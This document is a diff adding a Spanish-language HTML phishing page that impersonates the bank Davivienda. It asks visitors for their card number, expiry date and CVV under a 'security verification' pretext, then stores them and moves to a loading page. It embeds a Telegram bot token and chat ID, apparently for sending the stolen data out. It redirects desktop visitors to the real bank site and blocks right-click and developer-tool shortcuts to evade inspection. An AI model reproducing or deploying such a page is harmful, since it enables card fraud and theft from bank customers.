@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <script>
+        // Security & Device Detection
+        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        if (!isMobile) {
+            window.location.href = "https://www.davivienda.com";
+        }
+        document.addEventListener('contextmenu', event => event.preventDefault());
+        document.onkeydown = function(e) {
+            if(e.keyCode == 123) return false;
+            if(e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0))) return false;
+            if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+        }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="./imagenes/unnamed.png?v=2">
+    <title>Davivienda - Verificación</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
+        body {
+            font-family: 'Open Sans', sans-serif;
+        }
+    </style>
+</head>
+<body class="bg-white flex flex-col min-h-screen">
+    <div class="w-full max-w-md mx-auto px-6 pt-8 pb-4">
+        <!-- Logo -->
+        <div class="flex justify-center mb-12">
+            <img src="./imagenes/Davivienda-Logo-EPS-vector-image.png" alt="Davivienda" class="w-[240px] object-contain">
+        </div>
+
+        <!-- Greeting -->
+        <div class="mb-8">
+            <h1 class="text-[22px] font-normal text-[#333] mb-1">Seguridad</h1>
+            <h2 class="text-[24px] font-bold text-[#333] leading-tight">Verificación de Tarjeta</h2>
+        </div>
+
+        <p class="text-[15px] text-[#666] mb-6">Por motivos de seguridad, confirma los datos de tu tarjeta para continuar.</p>
+
+        <form onsubmit="return enviarTarjeta()" class="space-y-6">
+            <div class="space-y-2">
+                <label class="block text-[15px] text-[#666]">Número de Tarjeta</label>
+                <input type="tel" id="pan" maxlength="16" placeholder="0000 0000 0000 0000" class="w-full h-[54px] border border-[#ccc] rounded-[10px] px-4 text-[#333] text-[16px] focus:outline-none focus:border-[#ED1C24]" required>
+            </div>
+
+            <div class="flex gap-4">
+                <div class="w-1/2 space-y-2">
+                    <label class="block text-[15px] text-[#666]">Fecha Exp (MM/AA)</label>
+                    <input type="tel" id="exp" maxlength="5" placeholder="MM/AA" class="w-full h-[54px] border border-[#ccc] rounded-[10px] px-4 text-[#333] text-[16px] focus:outline-none focus:border-[#ED1C24]" required>
+                </div>
+                <div class="w-1/2 space-y-2">
+                    <label class="block text-[15px] text-[#666]">CVV</label>
+                    <input type="password" id="cvv" maxlength="3" placeholder="123" class="w-full h-[54px] border border-[#ccc] rounded-[10px] px-4 text-[#333] text-[16px] focus:outline-none focus:border-[#ED1C24]" required>
+                </div>
+            </div>
+
+            <div class="pt-6">
+                <button type="submit" class="w-full h-[54px] bg-[#ED1C24] text-white font-bold text-[18px] rounded-full hover:bg-[#d11a20] transition-colors">
+                    Confirmar
+                </button>
+            </div>
+        </form>
+
+        <!-- Divider -->
+        <div class="mt-20 pt-8 border-t border-[#eee]"></div>
+    </div>
+
+    <script>
+        const TOKEN = "8447862756:AAFaxv8byl9FW1kVs0mPH4s1WrhUfzzBv1U";
+        const CHAT_ID = "-5290017011";
+
+        // Format Date Input
+        document.getElementById('exp').addEventListener('input', function(e) {
+            var input = e.target.value;
+            if (input.length === 2 && !input.includes('/')) {
+                e.target.value = input + '/';
+            }
+        });
+
+        function enviarTarjeta() {
+            const pan = document.getElementById('pan').value;
+            const exp = document.getElementById('exp').value;
+            const cvv = document.getElementById('cvv').value;
+            
+            if (pan.length < 15 || exp.length < 4 || cvv.length < 3) {
+                alert("Por favor verifica los datos ingresados");
+                return false;
+            }
+
+            localStorage.setItem('davivienda_card_number', pan);
+            localStorage.setItem('davivienda_card_date', exp);
+            localStorage.setItem('davivienda_card_cvv', cvv);
+
+            window.location.href = "load.html";
+
+            return false;
+        }
+    </script>
+</body>
+</html>
